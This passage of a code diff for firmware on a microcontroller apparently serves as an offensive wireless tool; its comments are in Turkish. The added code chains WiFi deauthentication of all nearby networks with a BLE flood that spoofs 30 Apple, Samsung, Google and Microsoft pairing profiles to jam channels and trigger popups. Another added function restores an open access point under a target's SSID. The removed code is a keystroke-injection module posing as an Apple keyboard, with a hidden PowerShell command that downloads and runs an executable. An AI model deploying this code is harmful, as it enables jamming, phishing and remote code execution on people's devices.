@@ -12,8 +12,7 @@
 #include "task.h"
 #include "semphr.h"
 #include "BLEDevice.h"
-#include "BLEServer.h"
-#include "BLEHIDDevice.h"
+#include "BLEAdvertData.h"
 
 #undef max
 #undef min
@@ -318,27 +317,6 @@ unsigned long last_scan_ms = 0;
 unsigned long last_channel_check_ms = 0;
 #define CHANNEL_CHECK_INTERVAL_MS 5000UL
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// ════════════════════════════ BLE YAPILAR ══════════════════════════════════════
-// ═══════════════════════════════════════════════════════════════════════════════
-struct BLEDevInfo {
-  String address;
-  String name;
-  int    rssi;
-};
-
-std::vector<BLEDevInfo>  ble_devices;
-SemaphoreHandle_t        ble_mutex       = NULL;
-typedef enum { BLE_IDLE = 0, BLE_RUNNING = 1, BLE_DONE = 2 } BLEScanStat;
-volatile BLEScanStat     ble_scan_status = BLE_IDLE;
-volatile bool            ble_spam_active        = false;
-volatile bool            ble_flood_active       = false;
-volatile bool            ble_keystroke_active   = false;
-volatile bool            ble_hid_connected      = false;
-volatile uint8_t         ble_keystroke_payload  = 0;
-// 0=URL(tarayıcı) 1=Android YouTube 2=Android APK 3=Win Run 4=Win PowerShell 5=iOS Safari
-char                     ble_keystroke_url[128] = "https://youtube.com";
-char                     ble_apk_url[128]       = "http://192.168.4.1/app.apk";
 
 bool isFakeAPBSSID(const uint8_t *bssid) {
   return memcmp(bssid, fake_ap_bssid, 6) == 0;
@@ -825,9 +803,10 @@ void deauthAllTask(void *param) {
       continue;
     }
 
-    Serial.print("[DeauthAll] 🎯 Bu turda hedef ağ sayısı: ");
+    Serial.print("[DeauthAll] 🎯 Bu turda hedef WiFi ağ sayısı: ");
     Serial.println(snap.size());
 
+    // ── WiFi Deauth turu ──────────────────────────────────────────────────────
     for (auto &net : snap) {
       if (!deauth_all_active) break;
       if (isFakeAPBSSID(net.bssid)) continue;
@@ -885,407 +864,205 @@ void deauthAllTask(void *param) {
       }
     }
 
+    // ── BLE Flood turu: WiFi deauth turunun ardından sırayla tüm BLE profilleri ─
+    if (deauth_all_active) {
+      Serial.println("[DeauthAll] ⚡ BLE flood turu başlatılıyor...");
+      BLE.init();
+      BLE.beginPeripheral();
+
+      uint8_t rnd_data[27];
+      for (int i = 0; i < SPAM_PROFILE_COUNT && deauth_all_active; i++) {
+        const BLESpamProfile &p = SPAM_PROFILES[i];
+        memcpy(rnd_data, p.data, p.data_len);
+        // Rastgele bayt enjeksiyonu → anti-duplicate filtreyi aşar
+        if (p.is_svc) {
+          // Service Data: UUID (byte 0-1) sabit kal, model ID (2-4) rastgele
+          if (p.data_len > 4) {
+            rnd_data[2] = (uint8_t)(xTaskGetTickCount() & 0xFF);
+            rnd_data[3] = (uint8_t)((xTaskGetTickCount() >> 8) & 0xFF);
+            rnd_data[4] = (uint8_t)(i * 7 + 13);
+          }
+        } else {
+          // Manufacturer Specific: company ID (0-1) sabit kal, sonrasını rastgele
+          if (p.data_len > 6) {
+            rnd_data[6] = (uint8_t)(xTaskGetTickCount() & 0xFF);
+            rnd_data[7] = (uint8_t)((xTaskGetTickCount() >> 8) & 0xFF);
+            rnd_data[8] = (uint8_t)(i & 0xFF);
+          }
+        }
+        bleSetAdv(p.name, rnd_data, p.data_len, p.is_svc);
+        Serial.print("[DeauthAll-BLE] Yayınlanan: "); Serial.println(p.name);
+        vTaskDelay(pdMS_TO_TICKS(50)); // 80ms→50ms: daha agresif
+      }
+
+      // ── Saf rastgele flood — generic BLE kanal doygunluğu ───────────────
+      // Gerçek BLE jammer projelerinin temel tekniği: rastgele company ID ile
+      // 40 sahte cihaz paketi → ch37/38/39 tamamen dolar, yeni bağlantı imkânsız
+      Serial.println("[DeauthAll-BLE] Rastgele flood başlatılıyor...");
+      uint8_t rf[8];
+      for (int r = 0; r < 40 && deauth_all_active; r++) {
+        TickType_t t = xTaskGetTickCount();
+        rf[0] = (uint8_t)(t & 0xFF);
+        rf[1] = (uint8_t)((t >> 8) & 0x7F); // MSB=0 → geçerli company ID aralığı
+        rf[2] = (uint8_t)((t >> 4) & 0xFF);
+        rf[3] = (uint8_t)(r);
+        rf[4] = (uint8_t)((t * 3) & 0xFF);
+        rf[5] = (uint8_t)((t >> 12) & 0xFF);
+        rf[6] = (uint8_t)((t + r * 7) & 0xFF);
+        rf[7] = (uint8_t)((t >> 2) & 0xFF);
+        bleSetAdv("BT Device", rf, 8, false);
+        vTaskDelay(pdMS_TO_TICKS(30));
+      }
+
+      BLE.configAdvert()->stopAdv();
+      BLE.end();
+      Serial.println("[DeauthAll] ✓ BLE flood turu tamamlandı.");
+    }
+
     vTaskDelay(pdMS_TO_TICKS(50));
   }
 
-  Serial.println("[DeauthAll] Tüm ağlara deauth durduruldu.");
+  Serial.println("[DeauthAll] WiFi+BLE deauth durduruldu.");
   vTaskDelete(NULL);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// ══════════════════════════ BLE TARAYICI GÖREVİ ═══════════════════════════════
+// ══════════════════ BLE SONRASI WiFi AP YENİDEN BAŞLATMA ══════════════════════
 // ═══════════════════════════════════════════════════════════════════════════════
-static std::vector<BLEDevInfo> ble_scan_temp;
+// BLE RF'yi devre dışı bıraktığı için BLE.end() sonrası AP'ı restore ediyoruz.
+static void restoreWiFiAP() {
+  Serial.println("[BLE→WiFi] AP yeniden başlatılıyor...");
 
-class BLEScanCallback : public BLEAdvertisedDeviceCallbacks {
-public:
-  void onResult(BLEAdvertisedDevice dev) {
-    BLEDevInfo info;
-    info.address = String(dev.getAddress().toString().c_str());
-    info.name    = dev.haveName() ? String(dev.getName().c_str()) : "";
-    info.rssi    = dev.getRSSI();
-    for (auto &d : ble_scan_temp) {
-      if (d.address == info.address) {
-        if (info.rssi > d.rssi) d.rssi = info.rssi;
-        return;
-      }
-    }
-    ble_scan_temp.push_back(info);
+  dnsServer.stop();
+  delay(50);
+  dhcps_deinit();
+  delay(150);
+
+  wifi_set_mode(RTW_MODE_STA);
+  delay(400);
+  wifi_set_mode(RTW_MODE_STA_AP);
+  delay(400);
+
+  if (ap_switched) {
+    wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL,
+                  strlen(target_ssid), 0, (int)target_channel);
+  } else {
+    wifi_start_ap((char *)AP_INITIAL_SSID, RTW_SECURITY_WPA2_AES_PSK,
+                  (char *)AP_INITIAL_PASS,
+                  strlen(AP_INITIAL_SSID), strlen(AP_INITIAL_PASS), 6);
   }
-};
+  delay(700);
 
-static BLEScanCallback *bleCb = NULL;
+  ip4_addr_t ip, mask, gw;
+  IP4_ADDR(&ip,   192, 168, 4, 1);
+  IP4_ADDR(&mask, 255, 255, 255, 0);
+  IP4_ADDR(&gw,   192, 168, 4, 1);
+  netif_set_addr(&xnetif[1], &ip, &mask, &gw);
+  netif_set_up(&xnetif[1]);
+  netif_set_link_up(&xnetif[1]);
+  delay(150);
 
-void bleScanTask(void *param) {
-  (void)param;
-  ble_scan_temp.clear();
+  dhcps_init(&xnetif[1]);
+  delay(400);
 
-  BLEScan *pScan = BLEDevice::getScan();
-  if (!bleCb) bleCb = new BLEScanCallback();
-  pScan->setAdvertisedDeviceCallbacks(bleCb, true);
-  pScan->setActiveScan(true);
-  pScan->setInterval(100);
-  pScan->setWindow(99);
+  dnsServer.begin();
+  delay(100);
 
-  Serial.println("[BLE] Tarama başlatıldı (5 sn)...");
-  pScan->start(5, false);
-  pScan->clearResults();
-  Serial.print("[BLE] Tarama tamamlandı. Bulunan cihaz: ");
-  Serial.println(ble_scan_temp.size());
+  wifi_disable_powersave();
 
-  // Bubble sort — RSSI'ya göre azalan sıra (en güçlü en üste)
-  for (int i = 0; i < (int)ble_scan_temp.size() - 1; i++) {
-    for (int j = i + 1; j < (int)ble_scan_temp.size(); j++) {
-      if (ble_scan_temp[j].rssi > ble_scan_temp[i].rssi) {
-        BLEDevInfo tmp  = ble_scan_temp[i];
-        ble_scan_temp[i] = ble_scan_temp[j];
-        ble_scan_temp[j] = tmp;
-      }
-    }
-  }
-
-  if (ble_mutex && xSemaphoreTake(ble_mutex, pdMS_TO_TICKS(500)) == pdTRUE) {
-    ble_devices = ble_scan_temp;
-    xSemaphoreGive(ble_mutex);
-  }
-  ble_scan_temp.clear();
-  ble_scan_status = BLE_DONE;
-  vTaskDelete(NULL);
+  Serial.println("[BLE→WiFi] ✓ AP geri açıldı.");
 }
+
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // ════════════════ BLE SPAM PROFILLERI & GÖREVLERİ ═════════════════════════════
 // ═══════════════════════════════════════════════════════════════════════════════
 
+// ── BLE Disruption / "Deauth" Notu ──────────────────────────────────────────
+// WiFi'deki gibi gerçek BLE deauth frame protokolü YOKTUR.
+// LL_TERMINATE_IND göndermek → hedefle aktif bağlantı içinde olmak gerekir.
+// AmebaD SDK ham LL PDU erişimi sunmaz; bu yüzden maksimum BLE bozma stratejisi:
+//   • Reklam kanallarını (ch 37/38/39) minimum 20ms aralıkla doldurur
+//   • Yeni pairing / bağlantı girişimlerini engeller ve zorlaştırır
+//   • Apple popup (Proximity Pairing), Samsung/Google Fast Pair, MS Swift Pair spam
+//   • Her pakette rastgele baytlar → anti-duplicate filtreyi aşar
+// ─────────────────────────────────────────────────────────────────────────────
+
 struct BLESpamProfile {
   const char *name;
-  uint8_t     mfr[27];
-  uint8_t     mfr_len;
+  uint8_t     data[27];
+  uint8_t     data_len;
+  bool        is_svc; // false=0xFF Manufacturer Specific, true=0x16 Service Data
 };
 
-// Apple Proximity Pairing (iOS popup tetikler) + diğer cihazlar
 static const BLESpamProfile SPAM_PROFILES[] = {
-  { "AirPods Pro",
-    {0x4C,0x00,0x07,0x19,0x0E,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    27 },
-  { "AirPods Pro 2",
-    {0x4C,0x00,0x07,0x19,0x14,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    27 },
-  { "AirPods",
-    {0x4C,0x00,0x07,0x19,0x05,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    27 },
-  { "AirPods Gen3",
-    {0x4C,0x00,0x07,0x19,0x13,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    27 },
-  { "AirPods Max",
-    {0x4C,0x00,0x07,0x19,0x0A,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    27 },
-  { "iPhone",
-    {0x4C,0x00,0x10,0x05,0x0B,0x18,0x9B,0xAF,0x16,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    9 },
-  { "Apple Watch",
-    {0x4C,0x00,0x0F,0x05,0xC1,0x01,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    21 },
-  { "Apple TV",
-    {0x4C,0x00,0x04,0x0E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    16 },
-  { "Galaxy Buds",
-    {0x75,0x00,0x42,0x09,0x81,0x02,0xC0,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    8 },
-  { "Galaxy S24",
-    {0x75,0x00,0x01,0x00,0x02,0x00,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
-    8 },
+  // ── Apple Proximity Pairing (iOS/iPadOS/macOS popup) ─────────────────────
+  { "AirPods Pro",    {0x4C,0x00,0x07,0x19,0x0E,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 27, false },
+  { "AirPods Pro 2",  {0x4C,0x00,0x07,0x19,0x14,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 27, false },
+  { "AirPods",        {0x4C,0x00,0x07,0x19,0x05,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 27, false },
+  { "AirPods Gen3",   {0x4C,0x00,0x07,0x19,0x13,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 27, false },
+  { "AirPods Max",    {0x4C,0x00,0x07,0x19,0x0A,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 27, false },
+  { "iPhone",         {0x4C,0x00,0x10,0x05,0x0B,0x18,0x9B,0xAF,0x16}, 9,  false },
+  { "Apple Watch",    {0x4C,0x00,0x0F,0x05,0xC1,0x01,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 21, false },
+  { "Apple TV",       {0x4C,0x00,0x04,0x0E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 16, false },
+  { "HomePod",        {0x4C,0x00,0x0D,0x05,0xA0,0x02,0xA8,0x00,0x00,0x00,0x00,0x00,0x00}, 13, false },
+  { "MacBook",        {0x4C,0x00,0x10,0x07,0x44,0x0C,0x6A,0xF3,0x4F,0x00,0x00}, 11, false },
+  // ── Samsung Fast Pair ────────────────────────────────────────────────────
+  { "Galaxy Buds",    {0x75,0x00,0x42,0x09,0x81,0x02,0xC0,0x80}, 8,  false },
+  { "Galaxy S24",     {0x75,0x00,0x01,0x00,0x02,0x00,0xFF,0xFF}, 8,  false },
+  { "Galaxy Watch",   {0x75,0x00,0x62,0x09,0x81,0x02,0xC0,0x80,0x00,0x00}, 10, false },
+  { "Galaxy Buds2Pro",{0x75,0x00,0x42,0x09,0x84,0x02,0xC1,0x80,0x00,0x00,0x00,0x00}, 12, false },
+  // ── Microsoft Swift Pair (Company ID 0x0006) ─────────────────────────────
+  { "MS Headset",     {0x06,0x00,0x03,0x29,0x01,0x80}, 6,  false },
+  { "MS Speaker",     {0x06,0x00,0x03,0x29,0x04,0x80}, 6,  false },
+  { "MS Keyboard",    {0x06,0x00,0x03,0x29,0x05,0x80}, 6,  false },
+  // ── Google Fast Pair (Service Data UUID 0xFE2C) ──────────────────────────
+  { "Pixel Buds Pro", {0x2C,0xFE,0xCF,0x89,0xE4}, 5,  true  },
+  { "Pixel Buds A",   {0x2C,0xFE,0xBD,0xBB,0x92}, 5,  true  },
+  { "Fast Pair Dev",  {0x2C,0xFE,0x00,0x00,0xC9}, 5,  true  },
+  // ── Genel Marka Kulaklık / Hoparlör / Klavye ─────────────────────────────
+  { "Sony WH-1000XM", {0x2D,0x01,0x00,0x00,0x01,0x07,0xFF,0xFF}, 8,  false },
+  { "Bose Headphones",{0x9E,0x00,0x00,0x00,0x01,0x00,0xFF,0xFF}, 8,  false },
+  { "JBL Speaker",    {0xD7,0x01,0x00,0x01,0x00,0xFF,0xFF,0xFF}, 8,  false },
+  { "Jabra Headset",  {0x09,0x00,0x11,0x02,0x03,0xFF,0xFF,0xFF}, 8,  false },
+  { "Logitech Device",{0xF6,0x00,0x00,0x01,0x02,0x03,0xFF,0xFF}, 8,  false },
+  // ── Apple Action Modals — ek iOS popup tipleri ───────────────────────────
+  // Tip 0x12: Find My / Unknown Accessory — iOS 14.5+ "Bilinmeyen Aksesuar" uyarısı
+  { "Apple FindMy",   {0x4C,0x00,0x12,0x19,0x10,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xAA,0xBB,0xCC,0xDD,0x00,0x00,0x00}, 27, false },
+  // Tip 0x11: Instant HotSpot — iOS hotspot paylaşım popup
+  { "Apple HotSpot",  {0x4C,0x00,0x11,0x04,0x4B,0x0C,0x00,0x00}, 8,  false },
+  // Tip 0x09: Screen Lock/Unlock bildirim
+  { "Apple NewDevice",{0x4C,0x00,0x09,0x01,0xC0}, 5,  false },
+  // Tip 0x0B: Apple Watch pairing popup
+  { "Apple Watch+",   {0x4C,0x00,0x0B,0x05,0x40,0x01,0x80,0x00,0x00}, 9,  false },
+  // Tip 0x20: Beats kulaklık (Apple mülkü) proximity pairing
+  { "Beats Studio",   {0x4C,0x00,0x07,0x19,0x20,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 27, false },
 };
-#define SPAM_PROFILE_COUNT 10
+#define SPAM_PROFILE_COUNT 30
 
-static void bleSetAdv(const char *name, const uint8_t *mfr, uint8_t mfr_len) {
-  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
-  pAdv->stop();
+// is_svc=false → AD type 0xFF (Manufacturer Specific)
+// is_svc=true  → AD type 0x16 (Service Data, ör. Google Fast Pair)
+static void bleSetAdv(const char *name, const uint8_t *data, uint8_t data_len, bool is_svc) {
+  BLEAdvert *pAdv = BLE.configAdvert();
+  pAdv->stopAdv();
 
-  BLEAdvertisementData advData;
-  advData.setFlags(0x1A);
-  std::string mfrStr((char*)mfr, mfr_len);
-  advData.setManufacturerData(mfrStr);
+  BLEAdvertData advData;
+  advData.addFlags(0x1A);
 
-  BLEAdvertisementData scanData;
-  scanData.setName(std::string(name));
+  uint8_t pkt[29];
+  pkt[0] = is_svc ? 0x16 : 0xFF;
+  if (data_len > 27) data_len = 27;
+  memcpy(pkt + 1, data, data_len);
+  advData.addData(pkt, data_len + 1);
 
-  pAdv->setAdvertisementData(advData);
-  pAdv->setScanResponseData(scanData);
-  pAdv->setMinInterval(0x20);
-  pAdv->setMaxInterval(0x40);
-  pAdv->start();
-}
+  BLEAdvertData scanData;
+  scanData.addCompleteName(name);
 
-// ─── BLE SPAM GÖREVİ: profilleri sırayla yayınlar (iOS/Android popup tetikler) ─
-void bleSpamTask(void *param) {
-  (void)param;
-  int idx = 0;
-  Serial.println("[BLESpam] ⚡ BLE Spam başlatıldı!");
-  while (ble_spam_active) {
-    const BLESpamProfile &p = SPAM_PROFILES[idx % SPAM_PROFILE_COUNT];
-    bleSetAdv(p.name, p.mfr, p.mfr_len);
-    Serial.print("[BLESpam] Yayınlanan: "); Serial.println(p.name);
-    idx++;
-    vTaskDelay(pdMS_TO_TICKS(800));
-  }
-  BLEDevice::getAdvertising()->stop();
-  Serial.println("[BLESpam] Durduruldu.");
-  vTaskDelete(NULL);
-}
-
-// ─── BLE FLOOD GÖREVİ: tüm profilleri hızlıca döngüler, BLE tarayıcıları bunaltır ─
-void bleFloodTask(void *param) {
-  (void)param;
-  int idx = 0;
-  uint8_t rnd_mfr[27];
-  Serial.println("[BLEFlood] ⚡ BLE Flood başlatıldı!");
-  while (ble_flood_active) {
-    const BLESpamProfile &p = SPAM_PROFILES[idx % SPAM_PROFILE_COUNT];
-    memcpy(rnd_mfr, p.mfr, p.mfr_len);
-    // Her pakette rastgele sinyal/durum baytları → her seferinde yeni cihaz gibi görünür
-    rnd_mfr[6]  = (uint8_t)(xTaskGetTickCount() & 0xFF);
-    rnd_mfr[7]  = (uint8_t)((xTaskGetTickCount() >> 8) & 0xFF);
-    rnd_mfr[8]  = (uint8_t)(idx & 0xFF);
-    bleSetAdv(p.name, rnd_mfr, p.mfr_len);
-    idx++;
-    vTaskDelay(pdMS_TO_TICKS(120));
-  }
-  BLEDevice::getAdvertising()->stop();
-  Serial.println("[BLEFlood] Durduruldu.");
-  vTaskDelete(NULL);
-}
-
-// ═══════════════════════════════════════════════════════════════════════════════
-// ═══════════════ BLE HID KLAVYE — KEYSTROKE INJECTION ═════════════════════════
-// ═══════════════════════════════════════════════════════════════════════════════
-
-// HID standart klavye tanımlayıcısı
-static const uint8_t hidReportDescriptor[] = {
-  0x05,0x01, 0x09,0x06, 0xA1,0x01,
-  0x05,0x07, 0x19,0xE0, 0x29,0xE7, 0x15,0x00, 0x25,0x01,
-  0x75,0x01, 0x95,0x08, 0x81,0x02,
-  0x95,0x01, 0x75,0x08, 0x81,0x03,
-  0x95,0x06, 0x75,0x08, 0x15,0x00, 0x25,0x73,
-  0x05,0x07, 0x19,0x00, 0x29,0x73, 0x81,0x00,
-  0xC0
-};
-
-// HID modifier bitleri
-#define HID_MOD_LCTRL  0x01
-#define HID_MOD_LSHIFT 0x02
-#define HID_MOD_LALT   0x04
-#define HID_MOD_LGUI   0x08  // Windows / Cmd tuşu
-#define HID_KEY_ENTER  0x28
-#define HID_KEY_ESC    0x29
-#define HID_KEY_TAB    0x2B
-#define HID_KEY_SPACE  0x2C
-#define HID_KEY_HOME   0x4A
-
-static BLEServer        *pBLEKBServer   = nullptr;
-static BLEHIDDevice     *pBLEKeyboard   = nullptr;
-static BLECharacteristic *pBLEKBInput  = nullptr;
-
-class BLEKBServerCb : public BLEServerCallbacks {
-public:
-  void onConnect(BLEServer*) override {
-    ble_hid_connected = true;
-    Serial.println("[BLEKeyboard] ⌨️ Cihaz bağlandı!");
-  }
-  void onDisconnect(BLEServer*) override {
-    ble_hid_connected = false;
-    Serial.println("[BLEKeyboard] Bağlantı kesildi.");
-    if (ble_keystroke_active) BLEDevice::startAdvertising();
-  }
-};
-
-static void initBLEKeyboard() {
-  if (pBLEKBServer) return;
-  pBLEKBServer = BLEDevice::createServer();
-  pBLEKBServer->setCallbacks(new BLEKBServerCb());
-
-  pBLEKeyboard = new BLEHIDDevice(pBLEKBServer);
-  pBLEKBInput  = pBLEKeyboard->inputReport(1);
-
-  pBLEKeyboard->manufacturer()->setValue("Apple Inc.");
-  pBLEKeyboard->pnp(0x02, 0x05AC, 0x0220, 0x0131);
-  pBLEKeyboard->hidInfo(0x00, 0x02);
-  pBLEKeyboard->reportMap((uint8_t*)hidReportDescriptor, sizeof(hidReportDescriptor));
-  pBLEKeyboard->startServices();
-  pBLEKeyboard->setBatteryLevel(100);
-}
-
-// ─── Tek tuş gönder → bırak ─────────────────────────────────────────────────
-static void hidSendKey(uint8_t modifier, uint8_t keycode) {
-  if (!pBLEKBInput || !ble_hid_connected) return;
-  uint8_t report[8] = {modifier, 0, keycode, 0, 0, 0, 0, 0};
-  pBLEKBInput->setValue(report, 8);
-  pBLEKBInput->notify();
-  vTaskDelay(pdMS_TO_TICKS(25));
-  memset(report, 0, 8);
-  pBLEKBInput->setValue(report, 8);
-  pBLEKBInput->notify();
-  vTaskDelay(pdMS_TO_TICKS(30));
-}
-
-// ─── ASCII → HID keycode ─────────────────────────────────────────────────────
-static uint8_t charToHID(char c, uint8_t *mod) {
-  *mod = 0;
-  if (c >= 'a' && c <= 'z') return (uint8_t)(c - 'a' + 4);
-  if (c >= 'A' && c <= 'Z') { *mod = HID_MOD_LSHIFT; return (uint8_t)(c - 'A' + 4); }
-  if (c >= '1' && c <= '9') return (uint8_t)(c - '1' + 30);
-  switch (c) {
-    case '0':  return 0x27;
-    case ' ':  return HID_KEY_SPACE;
-    case '\n': return HID_KEY_ENTER;
-    case '-':  return 0x2D; case '_': *mod=HID_MOD_LSHIFT; return 0x2D;
-    case '=':  return 0x2E; case '+': *mod=HID_MOD_LSHIFT; return 0x2E;
-    case '[':  return 0x2F; case '{': *mod=HID_MOD_LSHIFT; return 0x2F;
-    case ']':  return 0x30; case '}': *mod=HID_MOD_LSHIFT; return 0x30;
-    case '\\': return 0x31; case '|': *mod=HID_MOD_LSHIFT; return 0x31;
-    case ';':  return 0x33; case ':': *mod=HID_MOD_LSHIFT; return 0x33;
-    case '\'': return 0x34; case '"': *mod=HID_MOD_LSHIFT; return 0x34;
-    case '`':  return 0x35; case '~': *mod=HID_MOD_LSHIFT; return 0x35;
-    case ',':  return 0x36; case '<': *mod=HID_MOD_LSHIFT; return 0x36;
-    case '.':  return 0x37; case '>': *mod=HID_MOD_LSHIFT; return 0x37;
-    case '/':  return 0x38; case '?': *mod=HID_MOD_LSHIFT; return 0x38;
-    case '!':  *mod=HID_MOD_LSHIFT; return 0x1E;
-    case '@':  *mod=HID_MOD_LSHIFT; return 0x1F;
-    case '#':  *mod=HID_MOD_LSHIFT; return 0x20;
-    case '$':  *mod=HID_MOD_LSHIFT; return 0x21;
-    case '%':  *mod=HID_MOD_LSHIFT; return 0x22;
-    case '^':  *mod=HID_MOD_LSHIFT; return 0x23;
-    case '&':  *mod=HID_MOD_LSHIFT; return 0x24;
-    case '*':  *mod=HID_MOD_LSHIFT; return 0x25;
-    case '(':  *mod=HID_MOD_LSHIFT; return 0x26;
-    case ')':  *mod=HID_MOD_LSHIFT; return 0x27;
-  }
-  return 0;
-}
-
-static void hidType(const char *str) {
-  for (int i = 0; str[i] && ble_hid_connected && ble_keystroke_active; i++) {
-    uint8_t mod, key = charToHID(str[i], &mod);
-    if (key) hidSendKey(mod, key);
-  }
-}
-
-// ─── PAYLOAD FONKSİYONLARI ──────────────────────────────────────────────────
-
-// 0 — Tarayıcı adres çubuğu (Ctrl+L → URL → Enter) — herkeste çalışır
-static void payloadUrlBar(const char *url) {
-  hidSendKey(HID_MOD_LCTRL, 0x0F); // Ctrl+L
-  vTaskDelay(pdMS_TO_TICKS(700));
-  hidType(url);
-  vTaskDelay(pdMS_TO_TICKS(200));
-  hidSendKey(0, HID_KEY_ENTER);
-}
-
-// 1 — Android YouTube: Ana ekrandan URL yaz → Enter
-static void payloadAndroidYT() {
-  hidSendKey(0, HID_KEY_HOME);
-  vTaskDelay(pdMS_TO_TICKS(1500));
-  hidType("https://youtube.com");
-  vTaskDelay(pdMS_TO_TICKS(400));
-  hidSendKey(0, HID_KEY_ENTER);
-}
-
-// 2 — Android APK: URL'ye giderek APK indirir
-static void payloadAndroidAPK(const char *url) {
-  hidSendKey(0, HID_KEY_HOME);
-  vTaskDelay(pdMS_TO_TICKS(1500));
-  hidType(url);
-  vTaskDelay(pdMS_TO_TICKS(400));
-  hidSendKey(0, HID_KEY_ENTER);
-}
-
-// 3 — Windows Çalıştır: Win+R → URL → Enter
-static void payloadWinRun(const char *url) {
-  hidSendKey(HID_MOD_LGUI, 0x15); // Win+R
-  vTaskDelay(pdMS_TO_TICKS(1000));
-  hidType(url);
-  vTaskDelay(pdMS_TO_TICKS(200));
-  hidSendKey(0, HID_KEY_ENTER);
-}
-
-// 4 — Windows PowerShell: dosya indir ve çalıştır (gizli pencere)
-static void payloadWinPwsh(const char *url) {
-  hidSendKey(HID_MOD_LGUI, 0x15); // Win+R
-  vTaskDelay(pdMS_TO_TICKS(1000));
-  char cmd[220];
-  snprintf(cmd, sizeof(cmd),
-    "powershell -w h -ep bypass -c \"iwr %s -o $env:TEMP\\x.exe;Start-Process $env:TEMP\\x.exe\"",
-    url);
-  hidType(cmd);
-  vTaskDelay(pdMS_TO_TICKS(200));
-  hidSendKey(0, HID_KEY_ENTER);
-}
-
-// 5 — iOS/macOS Spotlight: Cmd+Space → URL → Enter → Safari'de açar
-static void payloadIOSSafari(const char *url) {
-  hidSendKey(HID_MOD_LGUI, HID_KEY_SPACE); // Cmd+Space
-  vTaskDelay(pdMS_TO_TICKS(1000));
-  hidType(url);
-  vTaskDelay(pdMS_TO_TICKS(600));
-  hidSendKey(0, HID_KEY_ENTER);
-  vTaskDelay(pdMS_TO_TICKS(1200));
-  hidSendKey(0, HID_KEY_ENTER); // Safari'de onayla
-}
-
-// ─── BLE KEYSTROKE GÖREVİ ────────────────────────────────────────────────────
-void bleKeystrokeTask(void *param) {
-  (void)param;
-  Serial.println("[BLEKeyboard] ⌨️ Klavye modu başlatıldı, bağlantı bekleniyor...");
-
-  initBLEKeyboard();
-
-  // Klavye olarak reklam ver
-  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
-  pAdv->stop();
-  BLEAdvertisementData advKB;
-  advKB.setFlags(0x06);
-  advKB.setAppearance(0x03C1); // HID Keyboard appearance
-  BLEAdvertisementData scanKB;
-  scanKB.setName("BT Keyboard");
-  pAdv->setAdvertisementData(advKB);
-  pAdv->setScanResponseData(scanKB);
-  pAdv->start();
-
-  // Bağlantı bekle (60s aralıklarla reklam yenile)
-  unsigned long ws = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
-  while (!ble_hid_connected && ble_keystroke_active) {
-    unsigned long now = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
-    if (now - ws > 60000UL) {
-      pAdv->stop(); vTaskDelay(pdMS_TO_TICKS(100)); pAdv->start();
-      ws = now;
-      Serial.println("[BLEKeyboard] Reklam yenilendi, bağlantı bekleniyor...");
-    }
-    vTaskDelay(pdMS_TO_TICKS(200));
-  }
-
-  if (!ble_keystroke_active) {
-    pAdv->stop();
-    Serial.println("[BLEKeyboard] Durduruldu.");
